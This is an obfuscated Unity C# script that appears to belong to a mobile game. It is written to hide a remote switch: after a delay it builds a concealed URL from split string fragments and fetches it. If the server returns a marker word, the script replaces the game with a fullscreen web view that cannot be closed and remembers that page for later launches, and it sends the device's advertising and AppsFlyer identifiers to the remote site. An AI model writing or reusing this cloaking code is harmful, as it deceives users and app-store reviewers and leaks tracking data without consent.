using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class FierSdoermSdie : MonoBehaviour
{
    [HideInInspector] public string nisderSOdmersd = "";
    [HideInInspector] public string jusdSomdero = "";
    
    public List<string> juerSdomerSDomer;

    private void Awake()
    {
        if (PlayerPrefs.GetInt("fdjuerSdomer") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
                (string advertisingId, bool trackingEnabled, string error) => { nisderSOdmersd = advertisingId; });
        }
    }

    private void Start()
    {
        StartCoroutine(SkierSderSDeCpmcer());
    }

    private IEnumerator SkierSderSDeCpmcer()
    {
        yield return new WaitForSeconds(7f);

        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("juerSDpcmeSDiwe", string.Empty) != string.Empty)
            {
                CbSDoeSdERREo(PlayerPrefs.GetString("juerSDpcmeSDiwe"));
            }
            else
            {
                foreach (string n in juerSdomerSDomer)
                {
                    jusdSomdero += n;
                }

                StartCoroutine(McoerSDoerCer());
            }
        }
        else
        {
            YercHsderpSDer();
        }
    }

    private void YercHsderpSDer()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        
        SceneManager.LoadScene(2);
    }

    private void CbSDoeSdERREo(string sodlerSNDer, string backb = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var cnierSDmersdnu = gameObject.AddComponent<UniWebView>();
        cnierSDmersdnu.SetToolbarDoneButtonText("");
        switch (backb)
        {
            case "0":
                cnierSDmersdnu.SetShowToolbar(true, false, false, true);
                break;
            default:
                cnierSDmersdnu.SetShowToolbar(false);
                break;
        }

        cnierSDmersdnu.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        cnierSDmersdnu.OnShouldClose += (view) => { return false; };
        cnierSDmersdnu.SetSupportMultipleWindows(true);
        cnierSDmersdnu.SetAllowBackForwardNavigationGestures(true);
        cnierSDmersdnu.OnMultipleWindowOpened += (view, windowId) =>
        {
            cnierSDmersdnu.SetShowToolbar(true);
        };
        cnierSDmersdnu.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (backb)
            {
                case "0":
                    cnierSDmersdnu.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    cnierSDmersdnu.SetShowToolbar(false);
                    break;
            }
        };
        cnierSDmersdnu.OnOrientationChanged += (view, orientation) =>
        {
            cnierSDmersdnu.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        cnierSDmersdnu.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("juerSDpcmeSDiwe", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("juerSDpcmeSDiwe", url);
            }
        };
        cnierSDmersdnu.Load(sodlerSNDer);
        cnierSDmersdnu.Show();
    }
    
    private IEnumerator McoerSDoerCer()
    {
        using (UnityWebRequest truepsdsd = UnityWebRequest.Get(jusdSomdero))
        {
            truepsdsd.timeout = 4;
            yield return truepsdsd.SendWebRequest();
            if (truepsdsd.isNetworkError)
            {
                YercHsderpSDer();
            }

            try
            {
                if (truepsdsd.result == UnityWebRequest.Result.Success)
                {
                    if (truepsdsd.downloadHandler.text.Contains("lafesignik"))
                    {
                        try
                        {
                            var subs = truepsdsd.downloadHandler.text.Split('|');
                            CbSDoeSdERREo(
                                subs[0] + "?idfa=" + nisderSOdmersd + PlayerPrefs.GetString("sdjueSomCperSdner", string.Empty),
                                subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            CbSDoeSdERREo(truepsdsd.downloadHandler.text + "?idfa=" + nisderSOdmersd + "&gaid=" +
                                          AppsFlyerSDK.AppsFlyer.getAppsFlyerId() +
                                          PlayerPrefs.GetString("sdjueSomCperSdner", string.Empty));
                        }
                    }
                    else
                    {
                        YercHsderpSDer();
                    }
                }
                else
                {
                    YercHsderpSDer();
                }
            }
            catch
            {
                YercHsderpSDer();
            }
        }
    }
}
